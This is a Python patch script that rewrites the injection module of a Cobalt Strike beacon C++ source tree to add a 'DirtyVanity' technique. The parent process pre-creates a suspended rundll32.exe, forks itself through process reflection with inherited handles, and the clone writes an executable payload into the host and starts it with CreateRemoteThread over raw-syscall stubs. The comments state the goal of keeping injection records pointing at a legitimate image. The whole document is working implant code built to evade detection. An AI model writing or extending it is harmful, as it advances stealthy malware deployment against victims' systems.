#!/usr/bin/env python3
"""DirtyVanity v3: pre-created host + inherited handle + raw-syscall launch."""
import io

p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\inject_tier2.cpp"
s = io.open(p, encoding="utf-8").read()

# 1) mailbox + trampoline + launch rewrite
old = s[s.find("typedef struct {\n\tvolatile LONG go;"):s.find("void dv_nursery_init(void) {")]
assert len(old) > 200
new = """typedef struct {
	volatile LONG go;
	void * host;      /* suspended host pre-created by the healthy parent;
	                   * the INHERIT_HANDLES fork copies the handle table
	                   * 1:1, so the same VALUE works inside the clone */
	char * payload;   /* dll bytes already mirrored into the clone (RX) */
	int    plen;
	void * param;     /* parameter blob already mirrored (RW) */
	int    plen_arg;
} DV_MAILBOX;

static DV_MAILBOX dv_mailbox = { 0, NULL, NULL, 0, NULL, 0 };
static HANDLE dv_clone_handle = NULL;
static DWORD  dv_clone_pid = 0;

/* runs INSIDE the clone. The cloned user-mode runtime is a torn snapshot
 * (heap locks, FLS, RPC bindings mid-flight): a full beacon payload dies
 * in RPCRT4 on its first RPC touch and even CreateProcessA faults in
 * KERNELBASE (both observed live). The launch therefore touches NOTHING
 * user-mode: the host process was pre-created by the healthy PARENT at
 * boot, its handle inherited through the fork, and every operation here
 * routes through the raw-syscall gate wrappers (stubs resolved in the
 * parent and inherited with the address space; the profile's syscall
 * method selects them). The new session comes from the healthy host
 * while every injection record inside the clone points at our own
 * legitimate image - the DirtyVanity contract. */
static void dv_clone_launch(void * host, char * payload, int plen, void * param, int plen_arg) {
	void * remote;
	void * rparam = NULL;
	SIZE_T got = 0;
	DWORD  oldp = 0;
	HANDLE ht;

	if (host == NULL)
		return;

	remote = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen,
	                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote == NULL)
		return;
	if (!beacon_WriteProcessMemory(host, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen)
		return;
	beacon_VirtualProtectEx(host, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);

	if (plen_arg > 0) {
		rparam = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen_arg,
		                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (rparam != NULL)
			beacon_WriteProcessMemory(host, rparam, param, (SIZE_T)plen_arg, &got);
	}

	ht = beacon_CreateRemoteThread(host, NULL, 0, (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
	if (ht != NULL)
		CloseHandle(ht); /* kernel32 close: syscall-thin, no runtime state */
}

void dv_nursery_trampoline(void * unused) {
	(void)unused;
	while (!dv_mailbox.go)
		Sleep(200);
	dv_clone_launch(dv_mailbox.host, dv_mailbox.payload, dv_mailbox.plen,
	                dv_mailbox.param, dv_mailbox.plen_arg);
	for (;;)
		Sleep(60000);
}

"""
s = s.replace(old, new)

# 2) nursery_init: pre-create the host before the fork
old2 = """	/* flags: INHERIT_HANDLES | NO_SUSPEND (live matrix; see the flag notes
	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
	ZeroMemory(&info, sizeof(info));
	if (pReflect(GetCurrentProcess(), 0x2 | 0x4, dv_nursery_trampoline, NULL, NULL, &info) != 0) {
		spawn_log("dv: nursery reflect failed", 0x7fffffff);
		return;
	}
"""
assert s.count(old2) == 1
s = s.replace(old2, """	/* pre-create the suspended launch host NOW, from the healthy parent:
	 * the clone's torn runtime cannot even CreateProcessA (live: AV in
	 * KERNELBASE), so the host must exist before the fork - its handle
	 * rides into the clone through INHERIT_HANDLES (copied 1:1) */
	{
		STARTUPINFOA        si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcessA(NULL, (LPSTR)"rundll32.exe", NULL, NULL, FALSE,
		                    CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
			spawn_log("dv: host pre-create failed gle=", (long)GetLastError());
			return;
		}
		dv_mailbox.host = pi.hProcess;
		/* pi.hThread stays suspended forever - the injected beacon owns
		 * the host; keep the handle to avoid cleanup complexity */
	}

	/* the raw-syscall stubs must be resolved in the healthy parent so the
	 * inherited copies are ready inside the clone */
	syscalls_resolve();

	/* flags: INHERIT_HANDLES | NO_SUSPEND (live matrix; see the flag notes
	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
	ZeroMemory(&info, sizeof(info));
	if (pReflect(GetCurrentProcess(), 0x2 | 0x4, dv_nursery_trampoline, NULL, NULL, &info) != 0) {
		spawn_log("dv: nursery reflect failed", 0x7fffffff);
		return;
	}
"""
)
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("v3 in")

# 3) header for syscalls_resolve if needed
p2 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\inject_tier2.cpp"
s2 = io.open(p2, encoding="utf-8").read()
if '#include "syscalls.h"' not in s2:
    # it already includes syscalls.h per the original includes
    pass
print("done")
